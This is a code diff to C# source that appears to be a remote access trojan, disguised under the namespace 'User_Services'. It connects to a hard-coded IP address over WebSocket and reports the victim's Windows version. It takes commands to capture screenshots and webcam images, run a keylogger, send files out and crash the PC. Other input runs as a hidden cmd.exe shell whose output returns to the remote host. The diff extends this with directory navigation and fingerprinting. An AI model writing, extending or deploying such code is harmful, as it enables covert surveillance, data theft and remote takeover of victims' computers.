@@ -3,6 +3,7 @@ using System.Diagnostics;
 using WebSocketSharp;
 using System.Threading;
 using System.Drawing;
+using System.Net;
 using System.IO;
 using System.Drawing.Imaging;
 using System.Windows.Forms;
@@ -19,9 +20,14 @@ namespace User_Services
         static bool livelogging = true;
         static bool neverLogged = true;
         static bool neverLiveLogged = true;
+        static string dir = Environment.CurrentDirectory;
         static string logged = "";
         static string liveCharacter = "";
         static string lastLiveCharacter = "";
+        static string subKey = @"SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion";
+        static Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
+        static Microsoft.Win32.RegistryKey skey = key.OpenSubKey(subKey);
+        static string name = skey.GetValue("ProductName").ToString();
 
         [DllImport("user32.dll")]
         public static extern int SetForegroundWindow(IntPtr hWnd);
@@ -35,10 +41,26 @@ namespace User_Services
 
         }
 
+        public static string makeId()
+        {
+
+            var text = "";
+            var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            Random rnd = new Random();
+
+            for (var i = 0; i < 10; i++)
+                text += possible[rnd.Next(0, possible.Length)];
+
+            return text;
+
+        }
+
+        static string myID = makeId();
+
         public static void connection()
         {
 
-            using (var ws = new WebSocket("ws://154.49.211.230:4422"))
+            using (var ws = new WebSocket("ws://154.49.211.230:4422?id=" + makeId() + "&infos=" + name))
             {
 
                 ws.OnMessage += (sender, e) =>
@@ -61,7 +83,7 @@ namespace User_Services
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
                         ws.Send("##SCREENSHOT##" + base64String);
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message.StartsWith("sendkeys"))
                     {
@@ -74,7 +96,31 @@ namespace User_Services
                         {
                             ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
                         }
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
+                    }
+                    else if (message.StartsWith("CD"))
+                    {
+                        if (Directory.Exists(message.Split(' ')[1]) || Directory.Exists(dir + message.Split(' ')[1]))
+                        {
+                            if (message.Split(' ')[1][1] == ':')
+                            {
+                                dir = message.Split(' ')[1];
+                            }
+                            else
+                            {
+                                dir = dir + message.Split(' ')[1];
+                            }
+
+                        } else if (Directory.Exists(dir + '/' + message.Split(' ')[1]))
+                        {
+                            dir = dir + '/' + message.Split(' ')[1];
+                        }
+                        else
+                        {
+                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, path does not exist !\"}");
+                        }
+                        Debug.WriteLine(message.Split(' ')[1]);
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message.StartsWith("ppal"))
                     {
@@ -101,7 +147,7 @@ namespace User_Services
                         byte[] imageBytes = stream.ToArray();
                         string base64String = Convert.ToBase64String(imageBytes);
                         ws.Send("##SCREENSHOT##" + base64String);
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message == "keylogger live")
                     {
@@ -147,13 +193,13 @@ namespace User_Services
                                 Application.Run();
                             }).Start();
                         }
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
 
                     }
                     else if (message == "keylogger dump")
                     {
                         ws.Send("##LOGGED##" + logged);
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
 
                     }
                     else if (message == "keylogger stop")
@@ -162,7 +208,7 @@ namespace User_Services
                         logging = false;
                         livelogging = false;
                         logged = "";
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
 
                     }
                     else if (message == "webcam_snap")
@@ -177,11 +223,12 @@ namespace User_Services
                             var SigBase64 = Convert.ToBase64String(byteImage);
                             ws.Send("##WEBCAM_SNAP##" + SigBase64);
 
-                        }catch(Exception error)
+                        }
+                        catch (Exception error)
                         {
                             ws.Send("##ERROR##" + error.ToString().Replace("\"", ""));
                         }
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message.StartsWith("crash_pc"))
                     {
@@ -192,7 +239,7 @@ namespace User_Services
                             cmd.StartInfo.FileName = "cmd.exe";
                             cmd.Start();
                         }
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message == "speedtest")
                     {
@@ -201,16 +248,35 @@ namespace User_Services
                         Stopwatch sww = Stopwatch.StartNew();
                         webClient.DownloadFile("http://www.ovh.net/files/100Mio.dat", tempfile);
                         sww.Stop();
-
                         FileInfo fileInfo = new FileInfo(tempfile);
                         long speed = fileInfo.Length / sww.Elapsed.Milliseconds / 1000;
                         string jj = "{\"duration\":\"" + sww.Elapsed.Milliseconds + "\",\"file_size\":\"" + fileInfo.Length.ToString("N0") + "\",\"speed\":\"" + speed.ToString("N0") + "\"}";
                         ws.Send("##SPEEDTEST##" + jj);
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
                     }
                     else if (message == "SENDHELLO")
                     {
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                        ws.Send("hello ##" + dir + "##");
+                    }
+                    else if (message == "PREFIX")
+                    {
+
+                        Process cmd0 = new Process();
+                        cmd0.StartInfo.FileName = "cmd.exe";
+                        cmd0.StartInfo.RedirectStandardInput = true;
+                        cmd0.StartInfo.RedirectStandardOutput = true;
+                        cmd0.StartInfo.CreateNoWindow = true;
+                        cmd0.StartInfo.UseShellExecute = false;
+                        cmd0.Start();
+
+                        cmd0.StandardInput.WriteLine("");
+                        cmd0.StandardInput.Flush();
+                        cmd0.StandardInput.Close();
+                        cmd0.WaitForExit();
+                        var blank = cmd0.StandardOutput.ReadToEnd();
+                        ws.Send("##PREFIX##" + blank);
+                        ws.Send("hello ##" + dir + "##");
+
                     }
                     else if (message.StartsWith("upload_file"))
                     {
@@ -220,30 +286,50 @@ namespace User_Services
                             FileInfo info = new FileInfo(filepath);
                             ws.Send("##FILENAME##" + filepath);
                             ws.Send(info);
-                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                            ws.Send("hello ##" + dir + "##");
+                        } else if (System.IO.File.Exists(dir + filepath))
+                        {
+                            FileInfo info = new FileInfo(dir + filepath);
+                            ws.Send("##FILENAME##" + dir + filepath);
+                            ws.Send(info);
+                            ws.Send("hello ##" + dir + "##");
+                        }
+                        else if (System.IO.File.Exists(dir + '/' + filepath))
+                        {
+                            FileInfo info = new FileInfo(dir + '/' + filepath);
+                            ws.Send("##FILENAME##" + dir + '/' + filepath);
+                            ws.Send(info);
+                            ws.Send("hello ##" + dir + "##");
                         }
                         else
                         {
-                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exists !\"}");
-                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                            ws.Send("##MESSAGE##{\"type\":\"error\", \"message\":\"Error, file does not exist !\"}");
+                            ws.Send("hello ##" + dir + "##");
                         }
                     }
                     else
                     {
-                        Process cmd = new Process();
-                        cmd.StartInfo.FileName = "cmd.exe";
-                        cmd.StartInfo.RedirectStandardInput = true;
-                        cmd.StartInfo.RedirectStandardOutput = true;
-                        cmd.StartInfo.CreateNoWindow = true;
-                        cmd.StartInfo.UseShellExecute = false;
-                        cmd.Start();
+                        try
+                        {
+                            Process cmd = new Process();
+                            cmd.StartInfo.FileName = "cmd.exe";
+                            cmd.StartInfo.RedirectStandardInput = true;
+                            cmd.StartInfo.RedirectStandardOutput = true;
+                            cmd.StartInfo.CreateNoWindow = true;
+                            cmd.StartInfo.UseShellExecute = false;
+                            cmd.Start();
 
-                        cmd.StandardInput.WriteLine(message);
-                        cmd.StandardInput.Flush();
-                        cmd.StandardInput.Close();
-                        cmd.WaitForExit();
-                        ws.Send(cmd.StandardOutput.ReadToEnd());
-                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                            cmd.StandardInput.WriteLine("cd " + dir + " & " + message);
+                            cmd.StandardInput.Flush();
+                            cmd.StandardInput.Close();
+                            cmd.WaitForExit();
+                            ws.Send(cmd.StandardOutput.ReadToEnd());
+                            ws.Send("hello ##" + dir + "##");
+                        }
+                        catch (Exception error)
+                        {
+
+                        }
                     }
                 };
                 ws.OnClose += (sender, e) => {
@@ -254,14 +340,14 @@ namespace User_Services
                         if (sw.ElapsedMilliseconds > 2000)
                         {
                             ws.Connect();
-                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                            ws.Send("hello ##" + dir + "##");
                             break;
                         }
                     }
                 };
 
                 ws.Connect();
-                ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                ws.Send("hello ##" + dir + "##");
                 new ManualResetEvent(false).WaitOne();
 
             }
